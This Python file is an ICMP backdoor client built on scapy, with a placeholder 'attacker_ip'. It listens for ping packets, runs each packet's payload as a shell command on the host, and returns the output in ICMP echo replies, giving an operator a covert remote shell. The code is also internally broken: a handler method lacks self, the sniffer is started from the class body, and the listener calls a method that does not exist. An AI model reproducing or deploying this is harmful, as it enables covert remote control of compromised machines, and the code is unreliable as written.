from scapy.all import *
import subprocess
import os

class ICMPClient:
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip

    def execute_command(self, cmd):
        """Executes shell command and returns output"""
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output
        return output.strip()

    def handle_icmp(packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # Type 8 means ICMP Echo Request
            command = packet[Raw].load.decode(errors="ignore").strip()
            print(f"Received command: {command}")

            try:
                result = os.popen(command).read()
                if not result:
                    result = "[+] Command executed but returned no output."
            except Exception as e:
                result = f"[!] Error: {str(e)}"

            # Send ICMP Echo Reply with result
            response = IP(dst=packet[IP].src) / ICMP(type=0) / Raw(load=result)
            send(response, verbose=False)

    print("[+] Listening for ICMP commands...")
    sniff(filter="icmp", prn=handle_icmp, store=0)

    def start_listener(self):
        """Starts listening for ICMP commands"""
        print("[+] Listening for ICMP commands...")
        sniff(filter="icmp", prn=self.handle_packet, store=0)

if __name__ == "__main__":
    client = ICMPClient(attacker_ip="192.168.1.100")  # Change attacker IP
    client.start_listener()
